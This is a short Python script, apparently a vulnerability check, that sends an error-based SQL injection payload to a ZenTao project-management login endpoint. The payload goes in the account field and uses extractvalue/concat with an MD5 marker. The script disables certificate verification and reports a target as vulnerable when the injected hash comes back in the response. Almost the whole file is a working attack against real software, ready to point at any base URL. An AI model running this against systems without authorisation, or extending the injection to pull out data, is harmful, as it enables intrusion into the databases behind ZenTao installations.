import requests,re,urllib3
from hashlib import md5
import random
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomInt(s,e):
	key=random.randint(int(s),int(e))
	return key	
rand=randomInt(100000, 200000)

def substr(strs,s,lens):
	result=strs[s:lens]
	return result

def scan(baseurl):
	#print(r_url)
	url=baseurl+"zentao/user-login.html"
	body="account=admin'+and+(select+extractvalue(1,concat(0x7e,(select+SUBSTR(MD5({}),9,16)),0x7e)))#".format(rand)
	headers={'Content-Type': 'application/x-www-form-urlencoded', 'Referer': '{}/zentao/user-login.html'.format(baseurl)}
	#print(headers["Referer"])
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and substr((md5(str(rand).encode()).hexdigest()),8,16) in response.text:
		r1=True
	else:
		r1=False
	if r1:
		return True
	else:
		return False
